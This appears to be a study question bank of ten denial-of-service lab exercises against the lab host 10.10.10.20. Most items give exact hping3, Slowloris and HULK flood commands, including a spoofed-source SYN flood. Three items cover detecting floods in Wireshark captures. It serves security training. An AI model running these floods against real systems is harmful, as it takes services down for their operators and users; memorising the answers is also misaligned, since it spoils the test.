# Question Bank — Denial of Service (10 questions)

> Flood and resource-exhaustion attacks. Steps link into per-tool docs — click any command to read what it does.

**Legend:** 🟢 easy · 🟡 medium · 🔴 hard

---

### Q1 🟢 — Launch a SYN flood against 10.10.10.20 port 80 with hping3

**Category:** SYN flood | **Tools:** [hping3](../../tools/hping3.md)

**Steps:**
1. `sudo hping3 -S -p 80 --flood 10.10.10.20` ← [why -S --flood](../../tools/hping3.md#flood-options)
2. Leave it running for ~30 seconds.
3. Verify target's port 80 is unreachable (`curl http://10.10.10.20/`).

**Answer format:** proof of impact (e.g. "connection timed out") or packet count sent

**Gotcha:** `--flood` disables reply display — you won't see responses; that's expected.

---

### Q2 🟢 — Verify a SYN flood against 10.10.10.20 in Wireshark

**Category:** Attack verification | **Tools:** [wireshark](../../tools/wireshark.md)

**Steps:**
1. Start capture on `eth0` in [wireshark](../../tools/wireshark.md#usage).
2. Filter: `tcp.flags.syn == 1 && tcp.flags.ack == 0 && ip.dst == 10.10.10.20`
3. `Statistics` → `I/O Graph` to see the rate spike.

**Answer format:** packets/second rate (e.g. `~15000 pps`)

**Gotcha:** a real SYN flood has SYN >> SYN-ACK — if both are roughly equal, your target is still responding (not yet DoS'd).

---

### Q3 🟡 — Perform a spoofed-source SYN flood against 10.10.10.20

**Category:** Spoofed DoS | **Tools:** [hping3](../../tools/hping3.md)

**Steps:**
1. `sudo hping3 -S -p 80 --flood --rand-source 10.10.10.20` ← [why --rand-source](../../tools/hping3.md#spoofing)
2. This randomises the source IP on every packet — defenders can't rate-limit by src.
3. Verify in Wireshark: `tcp.flags.syn == 1` — source IPs should all differ.

**Answer format:** Wireshark screenshot or packet count with distinct sources

**Gotcha:** `--rand-source` defeats naive blocklists but also means you'll never see a reply — attack is one-way.

---

### Q4 🟢 — Launch an ICMP (ping) flood against 10.10.10.20

**Category:** ICMP flood | **Tools:** [hping3](../../tools/hping3.md)

**Steps:**
1. `sudo hping3 -1 --flood 10.10.10.20` ← [why -1](../../tools/hping3.md#modes)
2. `-1` = ICMP mode; `--flood` sends as fast as possible.

**Answer format:** proof of impact (target CPU spike or `ping` timeout)

**Gotcha:** many routers drop ICMP by default — this is often ineffective against hardened targets.

---

### Q5 🟢 — Launch a UDP flood against 10.10.10.20 port 53

**Category:** UDP flood | **Tools:** [hping3](../../tools/hping3.md)

**Steps:**
1. `sudo hping3 -2 -p 53 --flood 10.10.10.20` ← [why -2](../../tools/hping3.md#modes)
2. `-2` = UDP mode.
3. Optionally add `-d 1000` to increase payload size → more bandwidth per packet.

**Answer format:** bandwidth consumed or service outage proof.

---

### Q6 🟡 — Run a Slowloris attack against Apache on 10.10.10.20

**Category:** Slow HTTP DoS | **Tools:** [slowloris](../../tools/slowloris.md)

**Steps:**
1. `slowloris 10.10.10.20 -p 80 -s 500` ← [why -s](../../tools/slowloris.md#usage)
2. `-s 500` opens 500 concurrent half-open sockets; Apache's `MaxClients` gets exhausted.
3. Verify: `curl http://10.10.10.20/` times out.

**Answer format:** proof the site is unreachable, or `MaxClients` value reached.

**Gotcha:** Slowloris is effective against Apache/dhttpd. It does NOT work against nginx (event-driven) — recognize the server before attempting.

---

### Q7 🟡 — Run a HULK HTTP flood against 10.10.10.20

**Category:** L7 HTTP flood | **Tools:** [hulk](../../tools/hulk.md)

**Steps:**
1. `python3 hulk.py http://10.10.10.20/` ← [why hulk](../../tools/hulk.md#usage)
2. HULK generates randomised URLs + User-Agents to defeat caching.
3. Watch target's CPU climb.

**Answer format:** outage proof or HULK's request counter.

**Gotcha:** HULK needs a full URL (with scheme). `10.10.10.20` alone will crash it.

---

### Q8 🟡 — Identify a SYN flood in a given `attack.pcap`

**Category:** Pcap forensics | **Tools:** [wireshark](../../tools/wireshark.md)

**Steps:**
1. Open `attack.pcap` in [wireshark](../../tools/wireshark.md).
2. Filter: `tcp.flags.syn == 1 && tcp.flags.ack == 0`
3. `Statistics` → `Conversations` → `TCP` — look for one destination receiving thousands of SYNs from many sources.
4. Match pattern: SYN count >>> SYN-ACK count.

**Answer format:** target IP/port or attack type (e.g. `SYN flood`)

**Gotcha:** don't confuse a SYN flood with a port scan — a scan hits many ports on one host, a flood hits one port on one host.

---

### Q9 🟡 — Identify the attacker IP behind a non-spoofed UDP flood in `udp.pcap`

**Category:** Pcap forensics | **Tools:** [wireshark](../../tools/wireshark.md), [tcpdump](../../tools/tcpdump.md)

**Steps:**
1. Filter: `udp && ip.dst == <victim>`
2. `Statistics` → `Endpoints` → `IPv4` → sort by `Tx Packets`.
3. Top talker (non-victim) = attacker.

**Answer format:** attacker IP address.

**Gotcha:** if `--rand-source` was used, there is no single attacker IP to find — re-read the Q and answer "spoofed".

---

### Q10 🔴 — Generate a 1000-packet SYN flood against 10.10.10.20 with a specific source port 31337

**Category:** Custom DoS | **Tools:** [hping3](../../tools/hping3.md)

**Steps:**
1. `sudo hping3 -S -p 80 -s 31337 -c 1000 10.10.10.20` ← [why -s and -c](../../tools/hping3.md#common-options)
2. `-s 31337` sets static source port; `-c 1000` sends exactly 1000 packets.
3. Verify in Wireshark: `tcp.srcport == 31337`.

**Answer format:** `1000 packets transmitted` (from hping3 summary)

**Gotcha:** `-s` is source port (conflicts mentally with `-S` = SYN flag). Easy to mix up under exam pressure.

---

## 📌 Quick links

- [hping3](../../tools/hping3.md) · [slowloris](../../tools/slowloris.md) · [hulk](../../tools/hulk.md) · [wireshark](../../tools/wireshark.md)
- [DoS playbook](../../playbooks/dos-playbook.md)
- [09-dos README](../../09-dos/README.md)
